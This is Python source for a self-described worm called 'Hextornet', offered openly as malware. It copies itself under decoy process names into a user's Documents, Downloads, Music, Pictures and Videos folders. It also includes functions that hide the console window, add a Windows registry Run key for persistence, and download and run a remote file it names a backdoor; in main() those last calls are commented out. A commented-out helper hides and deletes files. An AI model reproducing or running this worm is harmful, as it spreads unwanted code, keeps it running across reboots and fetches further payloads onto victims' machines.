#!/usr/bin/env python

#import win32con, win32api, win32console, win32gui
#from _winreg import *
from shutil import copyfile
import os, getpass
from sys import argv
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil
import locale
from random import randint


print(
"""
[==========================]
+                          +
+     WORM HEXTORNET       +
+                          +
[==========================]
"""
)

src = os.path.abspath('hextornet.py')
usr = getpass.getuser()
lang = locale.getdefaultlocale()

hextornet = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']

dst = ""

def hide():
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,0)
	return True


def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)

    SetValueEx(key2change, "Process", 0, REG_SZ, new_file_path)


def windows_client(system = sys.platform):
    if system.startswith('win'):
        return True
    else:
	return False


def linux_client(system = sys.platform):
    if system.startswith('linux'):
        return True
    else:
        return False

def copyHex(hexworm, src, dst):
	copyfile(src, dst)
	print'[DST]', dst
	hextornet.remove(hexworm)

def propagate():
	print("==========Worm location==========")
	while len(directories) != 0:
		for directory in directories:
			if windows_client():
				for hexworm in hextornet:
					dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + str(hexworm) + '.py'
					copyHex(hexworm, src, dst)
					directories.remove(directory)

			elif linux_client():
				for hexworm in hextornet:
					print'[DEBUG] WORM | DIRECTORY:',hexworm, directory
					dst = '/' + usr + '/' + directory + '/' + str(hexworm) + '.py'
					copyHex(hexworm, src, dst)
				directories.remove(directory)
			else:
				dst = os.getcwd() + "hextornet.py"
	print("=================================")

#Use in windows
"""
def hide():
        for fname in os.listdir('.'):
                if fname.find('.py') == len(fname) - len('.py'):
                        #make the file hidden
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
                elif fname.find('.txt') == len(fname) - len('.txt'):
                        #make the file read only
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
                else:
                        #to force deletion of a file set it to normal
                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
			os.remove(fname)
"""


def downloadBackDoor(url):
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
        outfile.close()
        run(os.path.abspath(filename))
	print "==========finish downloading=========="


def run(program):
	process = sp.Popen('python '+program, shell=True)
	process.wait()


def main():
	#hide()
	#addStartup()
	propagate()
	#hide()
	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")


if __name__ == "__main__":
	main()
